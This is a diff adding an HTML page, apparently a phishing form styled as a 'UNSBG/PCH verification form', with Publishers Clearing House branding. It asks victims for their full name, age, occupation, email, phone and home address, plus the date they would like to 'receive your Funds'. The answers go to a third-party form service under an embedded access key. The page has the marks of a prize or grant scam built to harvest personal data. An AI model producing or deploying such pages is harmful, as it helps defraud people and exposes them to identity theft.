@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Form</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <img style="height: auto; width: 120px; margin: 0 auto; text-align: center; display: block;" src="pch_logo-removebg-preview.png" alt="">
+
+        <h2>UNSBG/PCH VERIFICATION FORM</h2>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="ae03bfd9-1b4d-4cf1-9e4b-d3422f6f15c1">
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
+            
+            <label for="date">Age</label>
+            <input type="text" id="age" name="age" required>
+            
+                        <label for="date">Occupation</label>
+                        <input type="text" id="occupation" name="Occupation" required>
+            
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="phone">Phone:</label>
+            <input type="tel" id="phone" name="phone" required>
+            
+            
+            <label for="address">Address</label>
+            <input type="text" id="address" name="address" required>
+            
+            
+                        <label for="date">Preferred Date to receive your Funds?</label>
+                        <br> <br>
+                        <input type="date" id="date" name="date" required> 
+<br> <br> 
+            <label for="message">Let us know if you have any questions or complaints?</label>
+            <textarea id="message" name="message" rows="4"></textarea>
+
+            <input type="submit" value="Submit">
+        </form>
+
+    </div>
+</body>
+</html>
